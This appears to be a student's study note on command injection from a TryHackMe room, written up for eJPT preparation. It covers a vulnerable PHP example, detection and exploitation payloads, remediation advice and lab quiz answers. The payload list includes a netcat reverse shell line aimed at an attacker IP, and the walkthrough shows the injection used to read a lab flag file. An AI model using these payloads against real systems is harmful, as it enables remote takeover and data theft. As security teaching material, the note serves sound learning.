---
{"dg-publish":true,"permalink":"/thm-notes/web-fundamentals-path/baisc-vuln/command-injection/","title":"Command Injection","tags":["web"]}
---

# Command Injection - Detailed Notes for eJPT Preparation

---

## TASK 1 - Introduction

### Definition of Command Injection

**Command Injection** is a web security vulnerability that allows an attacker to execute arbitrary commands on the host operating system via a vulnerable application. This typically occurs when user input is passed directly to a system shell or executed as a command without proper sanitization.

### Importance and Impact

- **Abuse of Functionality**: It exploits the application's behavior to run unintended commands.
- **Remote Code Execution (RCE)**: Often leads to complete system compromise.
- **Examples**: Reading sensitive files, listing user accounts, and modifying system data.

### How Command Injection Happens

Applications that interface with the operating system by executing system commands (using functions like `system()`, `exec()`, `popen()`, etc.) can be vulnerable if they incorporate unsanitized user inputs.

**Example PHP Vulnerable Code**:
```php
<?php
$title = $_GET['title'];
system("grep '$title' songtitle.txt");
?>
```
**Explanation**:
- The variable `$title` is derived directly from user input via `$_GET['title']`.
- This input is passed to the `system()` function, which executes it as part of a command on the server.

---

## TASK 2 - Discovering Command Injection

### Identifying Vulnerabilities

Command injection can be discovered by:
1. **Analyzing Source Code**: Look for functions that execute system commands with user input.
2. **Testing Inputs**: Injecting special characters or commands to see if the behavior changes.

### PHP Example Analysis

```php
<?php
$title = $_GET['title'];
system("grep '$title' songtitle.txt");
?>
```

**Variables and Methods**:
1. **User Input Storage**: `$title` holds the user's input.
2. **HTTP Method**: `GET` method is used to pass data.

**Command Execution Scenario**:
- User input directly appended to the `grep` command.
- Potential for command injection by including shell metacharacters.

### Questions Recap

1. **User Input Variable**: `$title`
2. **HTTP Method**: `GET`
3. **Route for Execution in Python Example**: `/id`

---

## TASK 3 - Exploiting Command Injection

### Types of Command Injection

1. **Verbose Command Injection**:
   - Direct feedback from the executed command.
   - Example: Injecting `whoami` returns the user.

2. **Blind Command Injection**:
   - No direct output. Detectable via indirect methods.
   - Example: Use `ping` to induce delays or `sleep` for response time measurement.

### Common Payloads

**Linux Payloads**:
- `whoami` (get the current user)
- `ls` (list directory contents)
- `ping -c 4 127.0.0.1` (network delay indication)
- `sleep 10` (delay to detect blind injection)
- `nc -e /bin/bash attacker_ip attacker_port` (reverse shell)

**Windows Payloads**:
- `whoami` (get the current user)
- `dir` (list directory contents)
- `ping -n 4 127.0.0.1` (network delay indication)
- `timeout 10` (delay to detect blind injection)

### Practical Application

**Example Injection**:
- To find the user: `& whoami`
- To create a delay: `& ping -c 4 127.0.0.1` (Linux), `& timeout 10` (Windows)

### Questions Recap

1. **Determine User**: `whoami`
2. **Tool for Blind Injection on Linux**: `ping`
3. **Tool for Blind Injection on Windows**: `timeout`

---

## TASK 4 - Remediating Command Injection

### Prevention Strategies

1. **Avoid Dangerous Functions**: Refrain from using functions that directly execute system commands (e.g., `exec()`, `system()`, `passthru()`).
2. **Sanitize Inputs**:
   - Allow only safe characters (e.g., use regex to permit only alphanumeric input).
   - Validate input types (e.g., integers only).

### Example Sanitization

**PHP Sanitization Example**:
```php
if (filter_input(INPUT_GET, 'number', FILTER_VALIDATE_INT) !== false) {
    // Proceed only if input is a valid integer
}
```

### Input Validation Techniques

1. **Whitelist Validation**: Accept only known good inputs.
2. **Blacklist Filtering**: Reject known bad inputs (less secure than whitelisting).
3. **Use Parameterized Commands**: Avoid shell invocation, use language-specific APIs for tasks like file handling or database access.

### Questions Recap

1. **Term for Input Cleaning**: `sanitisation`

---

## TASK 5 - Practical: Command Injection (Deploy)

### Hands-On Command Injection

**Steps to Exploit**:

1. **Determine Application User**:
   - Inject payload: `& whoami`
   - Result: `www-data`

2. **Retrieve Sensitive Data**:
   - Inject payload: `& cat /home/tryhackme/flag.txt`
   - Result: `THM{COMMAND_INJECTION_COMPLETE}`

### Summary

Understanding command injection involves recognizing how user inputs can influence system commands and the significance of sanitizing these inputs to prevent exploitation. This knowledge is essential for securing applications and is a critical aspect of the eJPT certification and real-world cybersecurity practices.

---

These notes provide a comprehensive overview of command injection, blending theoretical understanding with practical application and emphasizing preventive measures. This will aid beginners in preparing for the eJPT certification.